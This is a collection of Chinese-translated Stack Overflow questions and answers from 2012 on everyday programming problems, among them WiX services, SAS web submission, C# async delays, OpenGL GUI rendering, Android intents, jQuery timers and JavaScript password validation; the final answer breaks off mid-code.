当您`<ServiceInstall>`在 WiX 创作中指定一个元素时，它会反映在[ServiceInstall MSI 表](http://msdn.microsoft.com/en-us/library/aa371637%28VS.85%29.aspx)的记录中。此表需要一个组件作为外键。它检测服务的底层 EXE 文件的方式是`KeyPath`该组件的。据我所知，没有办法绕过它。

因此，在这种情况下，我为您看到了两种选择（我敢肯定，这两种选择都不是您想要或期望的）：

*   以通常的方式安装服务；忘记目标PC上有一个EXE文件并将其与MSI包一起带来
*   如果这是一项关键要求，请确保在继续安装之前安装服务

# sas - 来自 Web 的 SAS 输入（公式）

> ID：13429703
> 
> 赞同：3
> 
> 时间：2012-11-17T10:31:29.370
> 
> 标签：sas, web-access

我想通过 webfrontend 提交一个 proc SQL，用户可以在其中修改 1 或 2 个语句。

我通过谷歌找到了 sascgi。但有其他选择吗？例如，我可以将所有内容写入数据库（使用 php），然后以某种方式提交从该数据库读取的 sas 脚本。但这将比“直接”方式多一步。

还有其他方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-19T19:36:06.427

是的。最简单和最好的方法是获得 SAS EBI 许可并设置参数化存储过程。如果这不是一个选项，那么下一个最简单/最好的方法是许可 SAS/Intranet 模块。

还有其他替代方案，但它们都有点像黑客（并且可能存在安全漏洞，所以如果您的网站面向外部，我不推荐）。它们也有需要额外努力设置的缺点。

1.  如果您的网络服务器与您的 SAS 机器位于同一网络上，您可以让网络服务器远程启动 SAS 进程。使用 SAS`-sysin`命令行参数传入您需要的信息。在 Windows 环境中，您可以在远程计算机上启动一个进程，使用`psexec`该进程可通过 Microsoft 站点下载。在 UNIX 中，您可以使用`ssh`或`rsh`。如果您的网络服务器和 SAS 服务器是同一台机器，那么只需使用 PHP 启动系统进程。

    `psexec.exe -u DOMAIN\username -p password -w d:\working_folder \\computer_with_sas d:\batchfile.bat "parameters to pass in via SAS -sysin option"`

2.  构建一个套接字服务器。有很多关于这方面的文章，理论上 PHP 应用程序可以直接与套接字服务器通信。只是谷歌'sas套接字服务器'。如果您选择此选项，请考虑`srvany.exe`在 Windows 中使用将您的套接字服务器设置为服务。在 *nix 中，您可以将程序作为后台任务启动。

让我知道有关您正在运行的环境的更多详细信息，如有必要，我可以扩展此答案。不过，这应该给你足够的开始。

# php - CSS/HTML 填充问题

> ID：13429704
> 
> 赞同：0
> 
> 时间：2012-11-17T10:31:50.390
> 
> 标签：php, html, css, padding

这是我尝试做的事情：

我从 MYSQL 加载我的标签，并使用 css 使它们看起来不错。但是当一个标签字段为空时，它仍然显示边框和填充......作为一个空框，里面没有文本。当标签字段为空时，如何制作不显示边框和填充？

HTML 代码：

```
<a  href="#<?php echo $tag1;?>.php" class="tag" style="position: relative; top: 0px"><?php echo $tag1;?></a> 
```

CSS 代码：

```
.tag {
-moz-box-shadow:inset 0px 1px 0px 0px #ffffff;
-webkit-box-shadow:inset 0px 1px 0px 0px #ffffff;
box-shadow:inset 0px 1px 0px 0px #ffffff;
background-color:#ededed;
-moz-border-radius:5px;
-webkit-border-radius:5px;
border-radius:5px;
border:1px solid #dcdcdc; 
display:inline-block;
color:#777777;
font-family:arial;
font-size:10px;
font-weight:bold;
padding:2px 5px 2px 5px;
text-align:left;
text-decoration:none;
text-shadow:1px 1px 0px #ffffff;
float:left;
margin:5px 0px 0px 5px;
}.tag:hover {
background-color:#dfdfdf;
}.tag:active {
position:relative;
top:1px;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T10:35:40.080

为什么不只渲染有效标签？

```
<?php if(strlen($tag1) > 0) { ?>

<a  href="#<?php echo $tag1;?>.php" class="tag" style="position: relative; top: 0px"><?php echo $tag1;?></a>

<?php } ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T10:36:56.163

我建议在服务器端（php）生成完整的锚标记，如果标记为空，则不返回任何响应。

# c# - 如何获得可等待的 Thread.Sleep？

> ID：13429707
> 
> 赞同：177
> 
> 时间：2012-11-17T10:32:10.027
> 
> 标签：c#, .net, multithreading, async-await

我正在编写一个基于等待/睡眠范式的网络绑定应用程序。

有时，会发生连接错误，根据我的经验，等待一段时间然后重试操作是值得的。

问题是，如果我在 await/async 中使用 Thread.Sleep 或其他类似的阻塞操作，它会阻塞调用者线程中的所有活动。

我应该用什么替换 Thread.Sleep(10000) 以达到与

```
await Thread.SleepAsync(10000) 
```

?

**更新**

我更喜欢在不创建任何额外线程的情况下执行此操作的答案

* * *

## 回答 #1

> 赞同：405
> 
> 时间：2012-11-17T11:28:24.240

建议开始一个新线程的其他答案是一个坏主意 - 根本没有必要这样做。`async`/的部分意义`await`在于*减少*应用程序所需的线程数。

您应该改用[`Task.Delay`](http://msdn.microsoft.com/en-us/library/system.threading.tasks.task.delay.aspx)which*不需要*新线程，并且正是为此目的而设计的：

```
// Execution of the async method will continue one second later, but without
// blocking.
await Task.Delay(1000); 
```

# jsf-2 - 具有可编辑选项的动态数据表

> ID：13429710
> 
> 赞同：1
> 
> 时间：2012-11-17T10:32:46.607
> 
> 标签：jsf-2, primefaces

我想使用 primefaces 3.x 动态创建一个数据表，并且能够编辑整个单元格。所有单元格内容将是选择框。如果我在 primefaces 中使用“列”，我将能够创建动态列，但能够创建无法创建的可编辑单元格，请告知

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-18T20:32:30.113

目前看来是不可能的。
来自 PM 手册。
如果您不知道要渲染多少列，动态列很方便。Columns 组件用于以编程方式定义列。它需要一个集合作为值，两个迭代器变量称为 var 和 columnIndexVar。支持 sortBy 和 filterBy 等功能，但不支持**编辑等高级功能。**

# opengl - OpenGL 4.0+ 和“即时模式”-GUI

> ID：13429714
> 
> 赞同：0
> 
> 时间：2012-11-17T10:33:06.093
> 
> 标签：opengl, versions

我用按钮、菜单、列表等简单的小部件制作了一个 GUI 框架。它应该在现代 PC 和带有板载图形的笔记本电脑上运行（通常只支持 GL 1.4）。为了实现这一点，我在 opengl 1.x 中进行绘图（'立即模式'，显示列表，...）。

现在我有几个问题：

1) 如果我想创建一个使用 OpenGL 4.0+ 函数/着色器绘制的画布小部件，有什么问题吗？我可以将 OpenGL 4.0+ 与 OpenGL 1.x 混合使用吗？

2) 其他 OpenGL-GUI-API 是如何在那里绘制的？他们是否都使用 OpenGL 1.x 来支持尽可能多的 PC/笔记本电脑？我知道 Blender-GUI 使用 OpenGL 1.x，但这是最好的解决方案吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T16:18:51.180

> 如果我想创建一个使用 OpenGL 4.0+ 函数/着色器绘制的画布小部件，有什么问题吗？我可以将 OpenGL 4.0+ 与 OpenGL 1.x 混合使用吗？

假设您创建了一个[OpenGL 4.x 兼容性](http://www.opengl.org/wiki/Core_And_Compatibility_in_Contexts)上下文，是的。NVIDIA、AMD 和 Intel 支持兼容性配置文件（在 Intel 完全“支持”OpenGL 的程度上）。

> 其他 OpenGL-GUI-API 是如何在那里绘制东西的？他们是否都使用 OpenGL 1.x 来支持尽可能多的 PC/笔记本电脑？我知道 Blender-GUI 使用 OpenGL 1.x，但这是最好的解决方案吗？

最佳是一个主观术语。你可以在网上找到很多 OpenGL 代码（*任何类型的）都是旧的。*向后兼容的缺点之一是人们从不觉得需要升级他们的旧代码或教程。

但是没有什么能*阻止*您在核心 OpenGL 4.x 中渲染 GUI。毕竟，这就是每个 D3D10 游戏渲染其 GUI 的有效方式（因为它们在 D3D10 中不再具有固定功能）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T11:29:23.400

> 我可以将 OpenGL 4.0+ 与 OpenGL 1.x 混合使用吗？

~~不可以。OpenGL-1/2 兼容性配置文件仅适用于 OpenGL-3~~

实际上，从技术上讲，有一个可用的兼容性配置文件。但是，我看不出有人想使用它的任何合理理由。如果要使用 OpenGL-4 功能，那么程序的很多内部结构都需要改变，兼容性配置文件不再重要。

> 我知道 Blender-GUI 使用 OpenGL 1.x

目前正在进行大量开发以使其与 OpenGL-4 兼容。

> 为了实现这一点，我在 opengl 1.x 中进行绘图（'立即模式'，显示列表，...）。

显示列表和即时模式对您来说都是巨大的障碍。顶点数组从 OpenGL-1.1 开始可用。一旦你设置了顶点数组，它只需要最少的代码来支持 OpenGL-4。基本上，您需要做的就是通过提供正确的着色器来复制固定功能管道，并将顶点数组关联到正确的属性中。对于 OpenGL-4，您还需要一个顶点数组对象来保存顶点数组状态。

只要着色器不是强制性的，即您只做固定功能也可能的事情，您可以以一种支持 OpenGL-1.1 到 OpenGL-4.x 的全部范围的方式编写它，只需要很少的运行时条件在你的代码中。

* * *

### 由于评论而更新：

我正在考虑这样的事情：让我们假设一个源文件`guiGL.c`

```
#if GLPATH==2
#define GLPREFIX(x) glpath2_#x
#elif GLPATH==3
#define GLPREFIX(x) glpath3_#x
#endif

void GLPREFIX(draw_button)
{
#if GLPATH==2
    /* OpenGL 2 code here */
#endif

#if GLPATH==3
    /* OpenGL 3 code here */
#endif

    /* common code here */

} 
```

调度员`guiGLcommon.c`

```
void draw_button()
{
    if(opengl_major_version <= 2) {
        glpath2_draw_button();
    } else {
        glpath3_draw_button();
    }
} 
```

和一个`Makefile`

```
guiGL_glpath2.o: guiGL.c
    $(CC) -DGLPATH=2 -o guiGL_glpath2.o -c guiGL.c

guiGL_glpath3.o: guiGL.c
    $(CC) -DGLPATH=3 -o guiGL_glpath2.o -c guiGL.c

guiGL.o: guiGLcommon.c 
    $(CC) -o guiGL.o -c guiGLcommon.c

# ...

target: ...
    $(CC) -o target guiGL.o guiGL_path2.o guiGL_path3.o ... 
```

# cakephp-2.0 - Ajax 分页与 cakephp 中的过滤器

> ID：13429722
> 
> 赞同：1
> 
> 时间：2012-11-17T10:34:07.807
> 
> 标签：cakephp-2.0

任何人都可以在 cakephp 2.x 中给出 ajax 分页的最佳示例。

这也应该包括数据过滤。

我已经阅读了 cakephp 手册，但不太了解。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-30T04:50:07.513

经过长时间的搜索和工作，我开发了一个解决方案，如下所示：

客户端：

*   首先创建一个包含所有过滤选项的表单。
*   使用 ajax 提交表单。
*   使用 Post 方法提交表单。
*   使用序列化方法提交表单。

服务器端：

*   所有过滤器表单数据都将在 $this->request->data 中可用。
*   如下所述设置 PaginatorHelper 选项：

    $this->分页器->选项（数组（

    ```
    'url' => $this->passedArgs,

    'update' => 'element_id_to_be_updated',
    'evalScripts' => true,
    'data'=>http_build_query($this->request->data),
    'method'=>'POST', 
    ```

    ));

*   `'url' => $this->passedArgs`当点击分页链接时，回发所有命名参数。

*   `'data'=>http_build_query($this->request->data)`单击分页链接时，要回发所有帖子数据。

# android - 图片库发送位置 url 并显示 Android

> ID：13429733
> 
> 赞同：1
> 
> 时间：2012-11-17T10:36:04.090
> 
> 标签：android, android-intent, image-gallery

我正在使用意图将图像库中的选定图像发送到 NextImage.java 活动。我想将图像的选定位置和图像数组发送到下一个活动。我对意图部分感到困惑，有人可以帮忙吗

将点击的项目和 url 发送到 nextImage Activity 的代码。

公共无效showGallery（）{

```
 String[]imageUrls= new String[PostDetails.size()];

       for (int index=0;index<imageUrls.length;index++){
           imageUrls[index]=PostDetails.get(index).getImag();
    }

        options = new DisplayImageOptions.Builder()
        .showStubImage(R.drawable.stub_image)
        .displayer(new RoundedBitmapDisplayer(3))
        .cacheInMemory()
        .cacheOnDisc()
        .build();

    gallery = (Gallery) findViewById(R.id.img_gallery);
    gallery.setAdapter(new ImagePagerAdapter(imageUrls));

    gallery.setOnItemClickListener(new OnItemClickListener() {

          public void onItemClick(AdapterView<?> gallery, View view, int position, long id) {

              Intent galleryIntent  = new Intent(ImageGalleryActivity.this, MyNextImage.class);

              galleryIntent.putExtra(imageUrls, position);
              startActivity(galleryIntent);

          } 
```

}

我的下一个图像类如下。

公共类 NextImage 扩展 BaseActivity 实现 OnClickListener {

```
private ViewPager pager;
String[] imageUrls;
private DisplayImageOptions options;
String images;

public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    setContentView(R.layout.view_flipper_item);

    Bundle bundle = getIntent().getExtras();
    String[] imageUrls = bundle.getStringArray(images);
    int pagerPosition = bundle.getInt(position, 0); 
```

# windows-8 - WinRT 广告替代 Microsoft Pubcenter

> ID：13429734
> 
> 赞同：4
> 
> 时间：2012-11-17T10:36:20.983
> 
> 标签：windows-8, windows-runtime, ads

我想在我的应用程序中展示与应用程序主题相关的广告。但是 Microsoft Pubcenter 中几乎没有任何提供商。我可以在我的应用程序中使用替代方案吗？

如果是，我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-08T00:22:55.610

查看 adrotator 并使用来自 pubcenter 和 adduplex 的多个广告，这样您就可以获得 100% 的填充率。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-18T05:18:52.990

我知道的唯一替代方案是[AdDuplex](http://www.adduplex.com/)，它在 Windows Phone 7 上启动，但现在也[可用于 Windows 8](http://blog.adduplex.com/2012/07/adduplex-for-windows-8-is-here.html)。不过，这是一个交叉推广网络，所以我不确定它是否是您真正想要的。

# javascript - JavaScript/jQuery - 按键和超时后触发事件

> ID：13429737
> 
> 赞同：0
> 
> 时间：2012-11-17T10:36:54.337
> 
> 标签：javascript, jquery

我想在我的搜索功能中添加一个功能，该功能将在触发 keyup 事件后 n 秒内执行搜索。这个想法是，如果有人停止尝试一秒钟左右，他们将不必单击搜索按钮。到目前为止，我在单击、删除术语时和输入时触发了搜索功能。我在下面的代码中标记了我想要计时器的地方。我问这个是因为已经快凌晨 3 点了，JavaScript 让我头疼。对不起，如果重复...

这是我所拥有的：

```
$("#filter").keyup( function(e)
{
  var filter = $("#filter").val();

  if( filter == 0 || filter == '' || filter == null )
  {
    test();
  }
  else
  {
  *********** timer, then test();
  }

  if (e.which == 13)
  {
    e.preventDefault();
    test();
  }
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:43:31.087

```
$("#filter").keyup( function(e) {

  var filter = $("#filter").val(),
      timer = $('#filter').data('timeout'),
      n = 2;// the number of seconds to wait

  if(timer) {
      clearTimeout(timer);
      $('#filter').removeData('timeout');
  }

  if( filter == 0 || filter == '' || filter == null ) {
    test();
  } else if (e.which == 13) {
    e.preventDefault();
    test();
  }  else {
    $('#filter').data('timeout', setTimeout(test, 1000 * n));
  }      
}); 
```

# android - 操作栏问题

> ID：13429740
> 
> 赞同：0
> 
> 时间：2012-11-17T10:36:59.450
> 
> 标签：android, android-actionbar

我有一个只有视图标题和一个项目的操作栏。我已将`withText`属性应用到它，因为我希望 Android 显示项目标题。但是，它不会显示标题文本。它有足够的空间来展示。

其次，我想知道是否可以更改操作栏中的视图标题，例如单击按钮。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-26T21:20:01.807

即使您已设置您`MenuItem`的`showAsAction="withText"`选项，最终由系统决定是否显示文本。 `withText`只是向系统提示您希望显示文本。在大多数手机（例如 Galaxy Nexus）上，文本始终在纵向模式下隐藏，并且在横向模式下如果有空间就会显示。

至于设置`ActionBar`标题，你可以通过调用`setTitle`. 单击执行此操作`Button`可能如下所示：

```
Button myButton = (Button)findViewById(R.id.my_button);
myButton.setOnClickListener(new OnClickListener() {
    @Override
    public void onClick(View v) {
        ActionBar bar = getActionBar();
        bar.setTitle("New Title");
    }
}); 
```

# android - 从 Android 中的多个蓝牙 Socket 读取（单线程）

> ID：13429742
> 
> 赞同：2
> 
> 时间：2012-11-17T10:37:02.227
> 
> 标签：android, sockets, bluetooth

我有多个蓝牙套接字，我需要从每个套接字中读取而不会被阻止。

我可以为每个套接字启动一个新线程，但我更喜欢只有一个线程，因为我可以管理很多连接的套接字，并且启动很多线程会影响性能（如果我错了，请纠正我）

我可以使用 Java / Android API 中的 epoll / select 等效项吗？

太感谢了，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:18:51.533

好吧，由于蓝牙最多可以处理 7 个设备，因此启动 7 线程对性能没有实际影响，并且可能比使用多路复用器简单得多。

然后我将使用多个线程。

# iphone - 如何更改 UINavigationBar 中的编辑/完成按钮标题

> ID：13429743
> 
> 赞同：12
> 
> 时间：2012-11-17T10:37:04.960
> 
> 标签：iphone, objective-c, xcode

如果为 tableview 启用了编辑模式，它会显示一个标题为 Edit 的按钮，按下它时会将标题更改为 done

我想知道是否有办法将完成按钮标题更改为其他内容？

我已经更改了完成按钮的标题。

我使用的代码是

```
self.navigationItem.rightBarButtonItem = self.editButtonItem;
self.editButtonItem.title = @"Change"; 
```

现在编辑是变化

如何完成其​​他事情？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-17T10:47:02.847

您可以像这样更改编辑按钮的标题：-

```
- (void)setEditing:(BOOL)editing animated:(BOOL)animated
{
    // Make sure you call super first
    [super setEditing:editing animated:animated];

    if (editing)
    {
        self.editButtonItem.title = NSLocalizedString(@"Cancel", @"Cancel");
    }
    else
    {
        self.editButtonItem.title = NSLocalizedString(@"Edit", @"Edit");
    }
} 
```

它的工作方式类似于编辑：-

![在此处输入图像描述](../Images/fee2e28d3d39fa78330adc71ad63c876.png)

至

![在此处输入图像描述](../Images/c1d38a86df28554cfccd15681b11044f.png)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-06-16T23:19:58.727

这是为 Swift 更改它的方法

```
override func setEditing (editing:Bool, animated:Bool)
{
    super.setEditing(editing,animated:animated)
    if (self.editing) {
        self.editButtonItem().title = "Editing"
    }
    else {
        self.editButtonItem().title = "Not Editing"
    }
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-12-29T01:22:23.117

基于[Nitin 的回答](https://stackoverflow.com/a/13429811/2547229)，我建议采用一种稍微不同的方法，即使用内置`UIButtonBar`系统项。

这将为您的 UI 提供系统外观和感觉。例如，停止编辑的标准“完成”按钮在 iOS 8 上应该具有特定的**粗体**外观。Apple 将来可能会更改这些样式。通过使用系统定义的按钮，您的应用程序将自动选择当前的审美。

这种方法还为您提供免费的字符串本地化。Apple 已经为您将系统按钮标题翻译成 iOS 支持的数十种语言。

这是我得到的代码：

```
-(IBAction) toggleEditing:(id)sender
{
  [self setEditing: !self.editing animated: YES];
}

-(void) setEditing:(BOOL)editing animated:(BOOL)animated
{
  [super setEditing: editing animated: animated];

  const UIBarButtonSystemItem systemItem = 
    editing ? 
    UIBarButtonSystemItemDone : 
    UIBarButtonSystemItemEdit;

  UIBarButtonItem *const newButton = 
    [[UIBarButtonItem alloc] 
      initWithBarButtonSystemItem: systemItem 
                           target: self 
                           action: @selector(toggleEditing:)];

  [self.navigationItem setRightBarButtonItems: @[newButton] animated: YES];
} 
```

这里的示例适用于您`UIViewController`托管在 a 中的情况`UINavigationController`，因此有一个`UINavigationItem`实例。如果您不这样做，则需要以适当的方式更新栏项目。

在您`viewDidLoad`使用以下调用来配置准备使用的编辑按钮：

```
[self setEditing: NO animated: NO]; 
```

# javascript - 我应该为提交按钮的 onlick 上设置的 cookie 的值添加什么以记住它在页面重新加载后被单击？

> ID：13429747
> 
> 赞同：0
> 
> 时间：2012-11-17T10:37:35.520
> 
> 标签：javascript, button, cookies, submit, click

对此感到困惑......所以我有一个按钮，点击后会显示一个隐藏的 div。我试图设置一个cookie onlick，以便即使在页面重新加载后div也会显示，但我没有运气......

我不明白的是如何获得点击状态的值......

例如：

`setCookie('CookieName', 'What goes here for the clicked button state value?', 'LENGTH OF COOKIE LIFE')`

```
<html>
<head>

<script type="text/javascript" language="JavaScript">

function SetCookie() {
if(arguments.length < 2) { return; }
var n = arguments[0];
var v = arguments[1];
var d = 0;
if(arguments.length > 2) { d = parseInt(arguments[2]); }
var exp = '';
if(d > 0) {
    var now = new Date();
    then = now.getTime() + (d * 24 * 60 * 60 * 1000);
    now.setTime(then);
    exp = '; expires=' + now.toGMTString();
    }
document.cookie = n + "=" + escape(String(v)) + '; path=/' + exp;
} // function SetCookie()

function ReadCookie(n) {
var cookiecontent = new String();
if(document.cookie.length > 0) {
    var cookiename = n+ '=';
    var cookiebegin = document.cookie.indexOf(cookiename);
    var cookieend = 0;
    if(cookiebegin > -1) {
        cookiebegin += cookiename.length;
        cookieend = document.cookie.indexOf(";",cookiebegin);
        if(cookieend < cookiebegin) { cookieend = document.cookie.length; }
        cookiecontent = document.cookie.substring(cookiebegin,cookieend);
        }
    }
return unescape(cookiecontent);
} // function ReadCookie()
// —&gt;
</script>

<style type="text/css">
#sub3 {
position: absolute;
left: 100px;
top: 200px;
background-color: #f1f1f1;
width: 180px;
padding: 10px;
color: black;
border: #0000cc 2px dashed;
display: none;
}
</style>

<script language="JavaScript">
function setVisibility(id, visibility) {
document.getElementById(id).style.display = visibility;
}
</script>

</head>
<body >

<script language="JavaScript">
function clicked() {
    setVisibility(id, visibility);
    setCookie() // this calls your set cookie function
    return true;
}
</script>

<input id="input1" type=button value='Show Layer' onclick="clicked();">

<div id="sub3">Message Box</div>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T10:51:23.380

您的函数`setVisibility(id, visibility)`接受 2 个属性，您需要指定值，例如`setVisibility('sub3', 'block')`是否要显示您的块。

您需要将参数传递给您的函数`SetCookie(name, value)`和`GetCookie(name)`.

`GetCookie(name)`如果函数返回值，您还需要在页面加载事件中显示您的块。

# c# - 如何比较两个 textbox.text 是否大于其他带有错误提供程序的 textbox.text？

> ID：13429749
> 
> 赞同：0
> 
> 时间：2012-11-17T10:37:51.807
> 
> 标签：c#, winforms, user-controls, comparison, errorprovider

我在 C# winform 的用户控件中放置了两个文本框。`txtFrom`和`txtTo`。我想比较两个 textbox.text ，如果`txtTo`小于`txtFrom`，则显示错误提供程序。我该怎么办？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:41:59.407

您不会将某些内容**与**错误提供者进行比较。错误提供程序仅显示控件具有与控件关联的错误。

*   将[ErrorProvider](http://msdn.microsoft.com/en-us/library/system.windows.forms.errorprovider.aspx)组件添加到您的表单
*   比较`txtFrom.Text`和`txtTo.Text`（例如在验证事件期间）
*   如果 text 较少（我不知道 less 对您意味着什么），则调用`errorProvider1.SetError(txtTo, "Text is less than txtFrom")`，否则调用`errorProvider1.SetError(txtTo, "")`

如何进行比较：

```
errorProvider1.SetError(txtFrom, "");
errorProvider1.SetError(txtTo, "");

int fromValue;
int toValue;

if (!Int32.TryParse(txtFrom.Text, out fromValue)
{
    errorProvider1.SetError(txtFrom, "Integer number required");
    return;
}

if (!Int32.TryParse(txtTo.Text, out toValue)
{
    errorProvider1.SetError(txtTo, "Integer number required");
    return;
}

if (toValue < fromValue)
{
    errorProvider1.SetError(txtTo, "To is less than From");
    return;
} 
```

还可以考虑使用`NumericUpDown`控件来避免文本解析内容。

# php - 在 PHP Simple HTML DOM Parser 中查找元素的正则表达式

> ID：13429755
> 
> 赞同：1
> 
> 时间：2012-11-17T10:38:12.240
> 
> 标签：php, html-parsing

我如何“找到”具有这些 id 的所有元素：

> ctl00_cphContent_ctl05_Panel01,
> 
> ctl00_cphContent_ctl06_Panel01,
> 
> ctl00_cphContent_ctl07_Panel01,
> 
> ctl00_cphContent_ctl08_Panel01 等...

我试过了

```
foreach($html->find('a#ctl00_cphContent_ctl'.*.'_Panel01') as $positions) { echo "Test!";} 
```

但它不起作用！有人能帮助我吗？我搜索但没有找到类似的东西......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T12:01:25.753

通过阅读简单的 HTML DOM 解析文档[http://simplehtmldom.sourceforge.net/manual.htm#section_find](http://simplehtmldom.sourceforge.net/manual.htm#section_find)，我认为它不包含完整的正则表达式功能。但是，它似乎确实具有基本匹配。尝试这个：

```
$html->find( '[id^=ctl00_cphContent_ctl]' ) 
```

显然，这不仅会匹配 ctl00_cphContent_ctl05_Panel01 之类的 id 标签，还会匹配 ctl00_cphContent_ctrandomstuffhere 之类的东西。但似乎不可能以您想要的方式进行完整的正则表达式匹配。

# php - Codeigniter 缓存文件不会被删除

> ID：13429762
> 
> 赞同：4
> 
> 时间：2012-11-17T10:38:36.903
> 
> 标签：php, codeigniter, caching

我正在尝试将网页缓存与 CodeIgniter 一起使用。它的文档说关于生成的缓存文件：

> 如果已过期，则会在发送到浏览器之前将其删除并刷新。

但我注意到过期的缓存文件没有被删除，我的缓存文件夹继续增长。

我该如何解决这种情况（可能没有删除缓存文件的 cron 作业）？

来源：[http ://codeigniter.com/user_guide/general/caching.html](http://codeigniter.com/user_guide/general/caching.html)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-06T02:37:41.547

您建议的 cron 作业是最有效的。你真的想通过你的缓存强制他们使用 glob() 来减慢用户体验吗？

您可以运行一个钩子来检测用户代理是否是机器人，并在这种情况下删除旧文件，但请注意您为哪个机器人运行它，否则您最终可能会在随机网站上出现一些“此页面很慢”的结果。:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-14T13:51:54.093

我设置了 60*24 分钟（一天）。也许我在目录上设置了错误的权限，它无法删除文件......现在一切正常

# c# - 如何在课堂上使用列表

> ID：13429764
> 
> 赞同：0
> 
> 时间：2012-11-17T10:38:45.157
> 
> 标签：c#

我有类同义词，如下：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Xml.Linq;

namespace Examples.NET
{
    public class Synonym
    {
        private string _kata;
        private List<string> _sinonim;

        public String Kata
        {
            get { return _kata; }
        }
        public List<string> Sinonim 
        {
            get 
            {
                return _sinonim; 
            }
        }

        public Synonym(string kata)
        {
            _kata = kata;
            List<string> _sinonim = new List<string>();

            XDocument xDoc = XDocument.Load("http://www.stands4.com/services/v2/syno.php?uid=2319&tokenid=LSRyvL5mGsHpEi4&word=" + kata);
            var sinonim = from isi in xDoc.Descendants("result")
                          select new
                          {
                              sinom = isi.Descendants("synonyms").First().Value
                          };
            foreach (var s in sinonim)
            {
                _sinonim.Add(s.sinom);
            }
        }

    }
} 
```

在主程序中，我有以下代码：

```
Synonym Syn = new Synonym("buy");

System.Console.WriteLine(Syn.Kata);

var sinom = from s in Syn.Sinonim
            select s;
foreach (var item in sinom)
{
  System.Console.WriteLine("data: " + item);
} 
```

但是，出现错误：在主程序中：“FROM S IN .....SELECT S”===========>>值不能为空。AND 参数名称：source

我想课堂上有错误

```
 public List<string> Sinonim 
  {
   get{ return _sinonim;}
  } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:46:56.513

这表明您的私有列表变量从未被分配，但事实并非如此。

`List<string> _sinonim = new List<string>();`

这隐藏了私有实例，因为名称相同。将构造函数中的那一行更改为此，它应该可以工作

`_sinonim = new List<string>();`

# javascript - 提交前检查密码是否匹配

> ID：13429768
> 
> 赞同：1
> 
> 时间：2012-11-17T10:38:56.687
> 
> 标签：javascript, html, validation, jsp

如何在 Javascript 中提交表单之前检查密码是否匹配。我下面的代码是当我重新输入密码时，如果它们不一样，它应该显示“密码不匹配”。我该如何添加？

我的 JSP 页面

```
<body bgcolor="#33CCCC">
<form name="reg" action="Register" method="post" onsubmit="return validate()">
    <table cellpadding=4 cellspacing=2 border=1 align="center">
        <tr>
            <th bgcolor="#999999" colspan=2>
                <b>
                    First Name<sup>
                    *</sup>
                </b>
                <br>
                <input type="text" name="firstname" value="" size=15 maxlength=20>
                </td>
                <td valign=top>
                    <br>
                    <input type="text" name="surname" value="" size=15 maxlength=20>
                </td>
        </tr>
        <tr bgcolor="#999966">
            <td valign=top>
                <b>
                    E-Mail<sup>
                    *</sup>
                </b>
                <br>
                <input type="text" name="email" value="" size=25 maxlength=125>
                <br>
            </td>
            <td valign=top>
                <b>
                    Zip Code<sup>
                    *</sup>
                </b>
                <br>
                <input type="text" name="zipcode" value="" size=5 maxlength=6>
            </td>
        </tr>
        <tr bgcolor="#999966">
            <td valign=top colspan=2>
                <b>
                    User Name<sup>
                    *</sup>
                </b>
                <br>
                <input type="text" name="uid" size=10 value="e" maxlength=10>
            </td>
        </tr>
        <tr bgcolor="#999966">
            <td valign=top>
                <b>
                    Password<sup>
                    *</sup>
                </b>
                <br>
                <input type="password" name="pwd" size=10 value="" maxlength=10>
            </td>
            <td valign=top>
                <b>
                    Confirm Password<sup>
                    *</sup>
                </b>
                <br>
                <input type="password" name="cpwd " size=10 value="" maxlength=10>
            </td>
        </tr>
        <tr bgcolor="#999966">
            <td valign=top colspan=2>
                <b>
                    Town:<sup>
                    *</sup>
                </b>
                <br>
                <input type="text" name="town" size=10 value="" maxlength=10>
                <br>
            </td>
        </tr>
        <tr bgcolor="#999966">
            <td valign=top colspan=2>
                <b>
                    City:<sup>
                    *</sup>
                </b>
                <br>
                <input type="text" name="city" size=10 value="" maxlength=10>
                <br>
            </td>
        </tr>
        <tr bgcolor="#663300">
            <td align=center colspan=2>
                <hr>
                <input type="submit" value="Submit">
            </td>
        </tr>
    </table>
</form>
</body> 
```

和我的 JS

```
<script>
    function validate() {
        var auser = document.reg.firstname.value;
        var invalid = /\W/;
        //Alphanumeric characters and Underscore permitted 
        if (auser == "") {
            alert("Enter First name!");
            return false;
        }
        var aname = document.reg.surname.value;
        invalid = /[\W_]/;
        //Alphabets and digits only allowed 
        if (apass == "") {
            alert("Enter Second name!");
            return false;
        }
        var apass = document.reg.pwd.value;
        invalid = /[\W_]/;
        //Alphabets and digits only allowed 
        if (apass == "") {
            alert("Enter password!");
            return false;
        }
        var apassnew = document.reg.cpwd.value;
        invalid = /[\W_]/;
        //Alphabets and digits only allowed 
        if (apass == "") {
            alert("Confirm password!");
            return false;
        }
    }
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:50:04.990

尝试将此添加到您的最后一个代码中：

```
if(apass=="") { 
alert("Confirm password!"); 
return false; 
} else if(apass != document.reg.pwd.value){
alert("Confirm Password doesn't match"); 
